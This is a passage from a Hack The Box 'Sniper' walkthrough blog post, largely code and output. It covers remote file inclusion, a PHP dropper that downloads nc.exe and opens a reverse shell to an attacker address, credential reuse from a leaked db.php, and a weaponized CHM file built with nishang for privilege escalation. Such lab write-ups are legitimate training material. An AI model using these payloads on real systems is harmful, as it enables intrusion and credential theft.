+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</pre></table></code></div></div><p>Creating a <code class="language-plaintext highlighter-rouge">.php</code> file to download <code class="language-plaintext highlighter-rouge">nc.exe</code> and connect back to us:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /root/Desktop/fileshare/rev.php
+&lt;?php
+<span class="c"># Create a temp dir</span>
+system<span class="o">(</span><span class="s2">"mkdir C:</span><span class="se">\\</span><span class="s2">tmp"</span><span class="o">)</span><span class="p">;</span>
+<span class="c"># Download nc.exe</span>
+system<span class="o">(</span><span class="s2">"curl http://10.10.XX.XX/nc.exe &gt; C:</span><span class="se">\\</span><span class="s2">tmp</span><span class="se">\\</span><span class="s2">nc.exe"</span><span class="o">)</span><span class="p">;</span>
+<span class="c"># Establish reverse shell</span>
+system<span class="o">(</span><span class="s2">"C:</span><span class="se">\\</span><span class="s2">tmp</span><span class="se">\\</span><span class="s2">nc.exe -e cmd.exe 10.10.XX.XX 1337"</span><span class="o">)</span><span class="p">;</span>
+?&gt;
+</pre></table></code></div></div><p>Starting our listener:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+</pre></table></code></div></div><p>Triggering our <code class="language-plaintext highlighter-rouge">.php</code> script and getting a shell:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="s1">'http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\shell.php'</span>
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 50128
+Microsoft Windows [Version 10.0.17763.678]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\wwwroot\blog&gt;whoami
+whoami
+nt authority\iusr
+</pre></table></code></div></div><h1 id="enumeration-2">Enumeration (2)</h1><p>Listing local users:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>C:\inetpub\wwwroot\blog&gt;net users
+net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            Chris                    DefaultAccount           
+Guest                    WDAGUtilityAccount       
+The command completed with one or more errors.
+</pre></table></code></div></div><p>Seems like the <code class="language-plaintext highlighter-rouge">user.txt</code> is residing in <code class="language-plaintext highlighter-rouge">Chris</code> but we do not know his credentials.</p><p>Looking around, I found MySQL credentials in <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\users</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>C:\inetpub\wwwroot\user&gt;type db.php
+type db.php
+&lt;?php
+// Enter your Host, username, password, database below.
+// I left password empty because i do not set password on localhost.
+$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
+// Check connection
+if (mysqli_connect_errno())
+  {
+  echo "Failed to connect to MySQL: " . mysqli_connect_error();
+  }
+?&gt;
+</pre></table></code></div></div><p>and also saw how the <code class="language-plaintext highlighter-rouge">login</code> feature for the website was implemented:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>&lt;?php
+require('db.php');
+session_start();
+// If form submitted, insert values into the database.
+if (isset($_POST['username'])){
+        // removes backslashes
+        $username = stripslashes($_REQUEST['username']);
+        //escapes special characters in a string
+        $username = mysqli_real_escape_string($con,$username);
+        $password = stripslashes($_REQUEST['password']);
+        $password = mysqli_real_escape_string($con,$password);
+        //Checking is user existing in the database or not
+        $query = "SELECT * FROM `users` WHERE username='$username'
+and password='".md5($password)."'";
+        $result = mysqli_query($con,$query) or die(mysql_error());
+        $rows = mysqli_num_rows($result);
+        if($rows==1){
+            $_SESSION['username'] = $username;
+            // Redirect user to index.php
+            header("Location: index.php");
+         }else{
+...
+</pre></table></code></div></div><p>From this, we can tell that some possible usernames and passwords are stored in the <code class="language-plaintext highlighter-rouge">users</code> table in the columns <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> so lets try to dump them out:</p><p>Creating a <code class="language-plaintext highlighter-rouge">.php</code> file to dump out the <code class="language-plaintext highlighter-rouge">users</code> table:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> ~/Desktop/fileshare/dump.php
+&lt;?php
+<span class="nv">$conn</span> <span class="o">=</span> mysqli_connect<span class="o">(</span><span class="s2">"localhost"</span>,<span class="s2">"dbuser"</span>,<span class="s2">"36mEAhz/B8xQ~2VM"</span>,<span class="s2">"sniper"</span><span class="o">)</span><span class="p">;</span>
+// Check connection
+<span class="k">if</span> <span class="o">(</span>mysqli_connect_errno<span class="o">())</span>
+  <span class="o">{</span>
+  <span class="nb">echo</span> <span class="s2">"Failed to connect to MySQL: "</span> <span class="nb">.</span> mysqli_connect_error<span class="o">()</span><span class="p">;</span>
+  <span class="o">}</span>
+<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT * from users"</span><span class="p">;</span>
+<span class="nv">$result</span> <span class="o">=</span> mysqli_query<span class="o">(</span><span class="nv">$conn</span>, <span class="nv">$sql</span><span class="o">)</span><span class="p">;</span>
+<span class="k">if</span> <span class="o">(</span>mysqli_num_rows<span class="o">(</span><span class="nv">$result</span><span class="o">)</span> <span class="o">&gt;</span> 0<span class="o">)</span> <span class="o">{</span>
+    // output data of each row
+    <span class="k">while</span><span class="o">(</span><span class="nv">$row</span> <span class="o">=</span> mysqli_fetch_assoc<span class="o">(</span><span class="nv">$result</span><span class="o">))</span> <span class="o">{</span>
+        print_r<span class="o">(</span><span class="nv">$row</span><span class="o">)</span><span class="p">;</span>
+    <span class="o">}</span>
+<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+    <span class="nb">echo</span> <span class="s2">"0 results"</span><span class="p">;</span>
+<span class="o">}</span>
+mysqli_close<span class="o">(</span><span class="nv">$conn</span><span class="o">)</span><span class="p">;</span>
+?&gt;
+</pre></table></code></div></div><p>Viewing the results:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl <span class="s1">'http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\dump.php'</span>
+...
+Array
+<span class="o">(</span>
+    <span class="o">[</span><span class="nb">id</span><span class="o">]</span> <span class="o">=&gt;</span> 1
+    <span class="o">[</span>username] <span class="o">=&gt;</span> superuser
+    <span class="o">[</span>email] <span class="o">=&gt;</span> admin@sniper.co
+    <span class="o">[</span>password] <span class="o">=&gt;</span> 6e573c8b25e9168e0c61895d821a3d57
+    <span class="o">[</span>trn_date] <span class="o">=&gt;</span> 2019-04-11 22:45:36
+<span class="o">)</span>
+...
+</pre></table></code></div></div><p>Putting the hash into Google (Yes Google), turns out it was the MD5 hash of <code class="language-plaintext highlighter-rouge">$uperpassw0rd</code>.</p><p>Using <code class="language-plaintext highlighter-rouge">smbmap</code>, I decided to manually test possible pairs of credentials since the password list was short:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>smbmap <span class="nt">-H</span> sniper.htb <span class="nt">-u</span> Chris <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$uperpassw0rd</span><span class="s2">"</span>
+<span class="o">[</span>+] Finding open SMB ports....
+<span class="o">[!]</span> Authentication error on sniper.htb
+<span class="o">[!]</span> Authentication error on sniper.htb
+root@kali:~/Desktop# smbmap <span class="nt">-H</span> sniper.htb <span class="nt">-u</span> Chris <span class="nt">-p</span> 36mEAhz/B8xQ~2VM
+<span class="o">[</span>+] Finding open SMB ports....
+<span class="o">[</span>+] User SMB session established on sniper.htb...
+<span class="o">[</span>+] IP: sniper.htb:445  Name: unknown                                           
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
+        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
+		...
+        IPC<span class="nv">$ </span>                                                   READ ONLY       Remote IPC
+</pre></table></code></div></div><p>Alright, we got Chris’s credentials. To login into <code class="language-plaintext highlighter-rouge">Chris</code>, we will need to do something like a <code class="language-plaintext highlighter-rouge">su</code> or <code class="language-plaintext highlighter-rouge">sudo</code> in Linux but for Windows! In Powershell, there is a cmdlet called <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-7"><code class="language-plaintext highlighter-rouge">Invoke-Command</code></a> which allows you to specify who to run as using <code class="language-plaintext highlighter-rouge">-Credential</code> or <code class="language-plaintext highlighter-rouge">-Session</code>.</p><p>Testing <code class="language-plaintext highlighter-rouge">Invoke-Command</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>C:\inetpub\wwwroot\blog&gt;powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\inetpub\wwwroot\blog&gt; $SecPassword = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
+PS C:\inetpub\wwwroot\blog&gt; $Cred = New-Object System.Management.Automation.PSCredential('.\Chris', $SecPassword)
+PS C:\inetpub\wwwroot\blog&gt; $TestPCSession = New-PSSession -Credential $Cred
+PS C:\inetpub\wwwroot\blog&gt; Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c whoami}
+sniper\chris
+</pre></table></code></div></div><p>It works! We were able to run commands as <code class="language-plaintext highlighter-rouge">chris</code>! Now lets try to establish another reverse shell as <code class="language-plaintext highlighter-rouge">chris</code>.</p><h1 id="usertxt">user.txt</h1><p>Starting our listener:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+</pre></table></code></div></div><p>And running <code class="language-plaintext highlighter-rouge">nc.exe</code> to connect back to us:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>PS C:\inetpub\wwwroot\blog&gt; Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c C:\tmp\nc.exe -e cmd.exe 10.10.XX 1337}
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49687
+Microsoft Windows [Version 10.0.17763.678]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Chris\Documents&gt;whoami
+whoami
+sniper\chris
+C:\Users\Chris\Documents&gt;type C:\Users\Chris\Desktop\user.txt
+type C:\Users\Chris\Desktop\user.txt
+21f4XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></table></code></div></div><h1 id="enumeration-2-1">Enumeration (2)</h1><p>Looking around, I found a file in <code class="language-plaintext highlighter-rouge">chris</code>’s download folder:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>C:\Users\Chris\Downloads&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6A2B-2640
+
+ Directory of C:\Users\Chris\Downloads
+
+04/11/2019  08:36 AM    &lt;DIR&gt;          .
+04/11/2019  08:36 AM    &lt;DIR&gt;          ..
+04/11/2019  08:36 AM            10,462 instructions.chm
+               1 File(s)         10,462 bytes
+               2 Dir(s)  17,988,661,248 bytes free
+</pre></table></code></div></div><p>Using <code class="language-plaintext highlighter-rouge">nc.exe</code>, I downloaded the <code class="language-plaintext highlighter-rouge">instructions.chm</code> file and opened it in a Windows VM.</p><p>Starting our listener:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337 <span class="o">&gt;</span> instructions.chm
+listening on <span class="o">[</span>any] 1337 ...
+</pre></table></code></div></div><p>Sending the file over:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>C:\Users\Chris\Downloads&gt;C:\tmp\nc.exe 10.10.XX.XX 1337 &lt; instructions.chm
+</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sniper9.png" alt="" /></p><p>Looks like we have a disgrunted employee here haha but nothing much here.</p><p>I also found a folder called <code class="language-plaintext highlighter-rouge">C:\Docs</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>C:\Docs&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6A2B-2640
+
+ Directory of C:\Docs
+
+10/01/2019  01:04 PM    &lt;DIR&gt;          .
+10/01/2019  01:04 PM    &lt;DIR&gt;          ..
+04/11/2019  09:31 AM               285 note.txt
+04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
+               2 File(s)        552,892 bytes
+               2 Dir(s)  17,993,322,496 bytes free
+</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">note.txt</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>Hi Chris,
+Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
+
+Regards,
+Sniper CEO.
+</pre></table></code></div></div><p>Wow what a tough boss… Hmm… Could the <code class="language-plaintext highlighter-rouge">instructions.chm</code> be the documentation that the boss is talking about? If we try copying the <code class="language-plaintext highlighter-rouge">instructions.chm</code> to <code class="language-plaintext highlighter-rouge">C:\Docs</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>C:\Docs&gt;copy C:\Users\Chris\Downloads\instructions.chm . 
+copy C:\Users\Chris\Downloads\instructions.chm . 
+        1 file(s) copied.
+
+C:\Docs&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6A2B-2640
+
+ Directory of C:\Docs
+
+03/29/2020  06:38 AM    &lt;DIR&gt;          .
+03/29/2020  06:38 AM    &lt;DIR&gt;          ..
+04/11/2019  08:36 AM            10,462 instructions.chm
+04/11/2019  09:31 AM               285 note.txt
+04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
+               3 File(s)        563,354 bytes
+               2 Dir(s)  17,974,849,536 bytes free
+</pre></table></code></div></div><p>And after a while, it disappeared!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>C:\Docs&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6A2B-2640
+
+ Directory of C:\Docs
+
+03/29/2020  06:38 AM    &lt;DIR&gt;          .
+03/29/2020  06:38 AM    &lt;DIR&gt;          ..
+04/11/2019  09:31 AM               285 note.txt
+04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
+               2 File(s)        552,892 bytes
+               2 Dir(s)  17,974,861,824 bytes free
+</pre></table></code></div></div><p>It is possible that the CEO is retrieving the file and opening it. Using <code class="language-plaintext highlighter-rouge">nishang</code>’s <a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1"><code class="language-plaintext highlighter-rouge">Out-CHM.ps1</code></a>, we can actually generate a malicious <code class="language-plaintext highlighter-rouge">.chm</code> that run arbitrary commands.</p><h1 id="roottxt">root.txt</h1><p>First we will need to install <a href="https://www.microsoft.com/en-sg/download/details.aspx?id=21138"><code class="language-plaintext highlighter-rouge">HTML Help Workshop</code></a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/sniper10.png" alt="" /></p><p>After some testing on my local machines, I managed to generate the correct <code class="language-plaintext highlighter-rouge">.chm</code> file:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\rizemon\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Out-CHM.ps1</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\rizemon\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Out-CHM</span><span class="w"> </span><span class="nt">-Payload</span><span class="w"> </span><span class="s2">"C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337"</span><span class="w"> </span><span class="nt">-HHCPath</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\HTML Help Workshop"</span><span class="w">
+</span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">HTML</span><span class="w"> </span><span class="nx">Help</span><span class="w"> </span><span class="nx">Compiler</span><span class="w"> </span><span class="nx">4.74.8702</span><span class="w">
+
+</span><span class="n">Compiling</span><span class="w"> </span><span class="nx">c:\Users\root\Desktop\doc.chm</span><span class="w">
+
+
+</span><span class="n">Compile</span><span class="w"> </span><span class="nx">time:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">minutes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">seconds</span><span class="w">
+</span><span class="mi">2</span><span class="w">       </span><span class="n">Topics</span><span class="w">
+</span><span class="nx">4</span><span class="w">       </span><span class="nx">Local</span><span class="w"> </span><span class="nx">links</span><span class="w">
+</span><span class="mi">4</span><span class="w">       </span><span class="n">Internet</span><span class="w"> </span><span class="nx">links</span><span class="w">
+</span><span class="mi">0</span><span class="w">       </span><span class="n">Graphics</span><span class="w">
+
+
+</span><span class="n">Created</span><span class="w"> </span><span class="nx">c:\Users\rizemon\Desktop\doc.chm</span><span class="p">,</span><span class="w"> </span><span class="nx">13</span><span class="p">,</span><span class="nx">438</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
+</span><span class="n">Compression</span><span class="w"> </span><span class="nx">increased</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">142</span><span class="w"> </span><span class="nx">bytes.</span><span class="w">
+</span></pre></table></code></div></div><p>After transfering the <code class="language-plaintext highlighter-rouge">doc.chm</code> to my Kali’s web server directory, I uploaded it to <code class="language-plaintext highlighter-rouge">C:\Docs</code> as <code class="language-plaintext highlighter-rouge">instructions.chm</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>C:\Docs&gt;curl http://10.10.XX.XX/doc.chm &gt; instructions.chm
+curl http://10.10.XX.XX/doc.chm &gt; instructions.chm
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 13436  100 13436    0     0  13436      0  0:00:01 --:--:--  0:00:01 18687
+</pre></table></code></div></div><p>And started our listener:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+</pre></table></code></div></div><p>After a while, the <code class="language-plaintext highlighter-rouge">instructions.chm</code> disappeared and look at what we got on our listener!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49709
+Microsoft Windows [Version 10.0.17763.678]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+sniper\administrator
+
+C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+5624XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a> <a href="/tags/chm/" class="post-tag no-text-decoration" >chm</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Sniper - rizemon's blog&url=https://rizemon.github.io/posts/sniper-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Sniper - rizemon's blog&u=https://rizemon.github.io/posts/sniper-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Sniper - rizemon's blog&url=https://rizemon.github.io/posts/sniper-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/bastion-htb/"><div class="card-body"> <span class="timeago small" > Sep 7, 2019 <i class="unloaded">2019-09-07T23:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bastion</h3><div class="text-muted small"><p> I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this...</p></div></div></a></div><div class="card"> <a href="/posts/cascade-htb/"><div class="card-body"> <span class="timeago small" > Jul 26, 2020 <i class="unloaded">2020-07-26T13:28:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Cascade</h3><div class="text-muted small"><p> Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM and a FlareVM. What I learnt from other writeups is that it was a good habit to map a domain n...</p></div></div></a></div><div class="card"> <a href="/posts/computingday2020-ctf/"><div class="card-body"> <span class="timeago small" > Sep 6, 2020 <i class="unloaded">2020-09-06T14:23:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NUS Computing Day 2020 CTF by NUS Greyhats</h3><div class="text-muted small"><p> Crypto Spin the letter around (50 pts) 1 2 Can you find the mystery message? yetz{pxevhfxmhvhfinmbgzwtr} To solve this challenge, we just need to apply the rotational cipher of 7 shifts on it. ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/forest-htb/" class="btn btn-outline-primary"><p>Hack The Box - Forest</p></a> <a href="/posts/traverxec-htb/" class="btn btn-outline-primary"><p>Hack The Box - Traverxec</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" 